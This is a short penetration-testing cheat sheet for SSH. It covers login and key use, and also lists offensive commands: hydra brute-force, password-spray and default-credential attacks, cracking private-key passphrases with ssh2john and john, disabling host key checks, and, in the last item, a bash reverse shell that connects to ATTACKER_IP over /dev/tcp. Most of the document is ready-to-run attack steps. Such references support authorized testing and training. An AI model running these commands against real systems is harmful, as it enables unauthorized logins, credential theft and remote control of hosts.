# Secure Shell (SSH)

## Port: 22

### 1) Authenticate via SSH

    ssh USER@IP

### 2) Authenticate using private key

Give appropriate permissions for the key

    chmod 600 id_rsa

Authenticate

    ssh USER@IP -i id_rsa

### 3) Brute force credentials

Brute force

    hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh

Password Spray

    hydra -L USERLIST -p password IP -t 4 ssh

Default credentials

    hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt IP ssh

### 4) Convert PuTTY key to OpenSSH format

    puttygen PUTTY_KEY -O private-openssh -o OUTPUT_KEY

### 5) Crack SSH Private keys

    ssh2john id_rsa > hash.txt

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

### 6) Run commands upon connection

    ssh USER@IP "whoami"

### 7) Bypass Host Key Checking

    ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no USER@IP

### 8) Force a different cipher

    ssh -c aes128-cbc USER@IP

### 9) Force an older SSH version

    ssh -1 USER@IP

### 10) Reverse shell with weak cryptographic algorithms

    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USER@IP -t 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'

